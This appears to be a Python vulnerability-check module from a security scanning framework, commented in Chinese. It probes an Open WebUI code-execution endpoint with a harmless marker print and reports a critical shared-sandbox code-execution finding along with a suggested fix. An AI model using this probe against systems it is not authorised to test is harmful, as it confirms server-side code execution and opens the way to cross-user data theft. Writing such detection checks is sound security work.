"""open-webui-code-execute-rce — Open WebUI 共享沙箱执行（私有零日模块）。

检测流程：/__routes__ fingerprint → 经 /api/v1/utils/code/execute 提交良性 marker 代码
→ 200 + stdout 标记即「任意登录用户可执行任意 Python（共享沙箱、跨用户残留互读）」；403 → 加固态零发现。
"""
from __future__ import annotations

import json
import urllib.error
import urllib.request

TARGET_SERVICE = "open-webui"
TARGET_PATH = "/api/v1/utils/code/execute"


def _request(method: str, url: str, body=None, headers=None, timeout: int = 15):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw, status = resp.read(), resp.status
    except urllib.error.HTTPError as exc:
        raw, status = exc.read(), exc.code
    text = raw.decode("utf-8", "replace")
    try:
        payload = json.loads(text)
    except ValueError:
        payload = text
    return status, payload


def _fingerprint(base: str):
    status, manifest = _request("GET", base + "/__routes__")
    if status != 200 or not isinstance(manifest, dict):
        return None, "fingerprint 失败：目标无 /__routes__ 清单（非实验室 mock 语义），不进入动作分支"
    for route in manifest.get("routes", []):
        if route.get("service") == TARGET_SERVICE and route.get("path") == TARGET_PATH:
            return manifest, None
    return manifest, f"fingerprint 未命中：目标无 {TARGET_SERVICE} {TARGET_PATH} 路由"


def run(ctx: dict, params: dict) -> dict:
    base = str(params.get("base_url", "")).rstrip("/")
    if not base:
        raise ValueError("缺少 params.base_url（mock 靶场地址，仅限授权范围）")
    marker = str(params.get("marker") or ctx.get("marker") or "TRIDENT-zeroday")

    manifest, miss = _fingerprint(base)
    if miss is not None:
        return {"summary": miss, "findings": [], "artifacts": []}

    code = f"print('TRIDENT benign marker: {marker}')"
    status, payload = _request("POST", base + TARGET_PATH, body={"code": code})
    findings: list[dict] = []
    if status == 200 and isinstance(payload, dict) and payload.get("ok"):
        findings.append({
            "sev": "critical",
            "title": "Open WebUI 共享沙箱执行：任意登录用户可执行任意 Python",
            "detail": "工具端点把用户代码送入共享 Jupyter 沙箱：无模块黑名单、无用户隔离、跨用户残留互读——低权限对话用户即得服务端代码执行，"
                      "并可读取其他用户残留会话与数据。",
            "evidence": json.dumps({
                "route": TARGET_PATH, "status": status, "stdout": payload.get("stdout"),
                "code_path": payload.get("code_path"), "mode": (manifest or {}).get("mode"), "marker": marker,
            }, ensure_ascii=False),
            "mapping": "零日登记册：智能体平台共享沙箱条目；链「智能体平台跨租户窃取 → 数据面串联」",
            "fix": "代码执行默认关闭或按用户独立沙箱（命名空间级隔离）；模块导入白名单；会话与残留按用户清理",
            "is_zeroday": True,
        })
        summary = "fingerprint 命中 open-webui；共享沙箱任意代码执行成立（vulnerable 姿态）"
    else:
        summary = f"fingerprint 命中 open-webui；代码执行被拒（status={status}，fixed/加固态）"
    return {"summary": summary, "findings": findings, "artifacts": []}
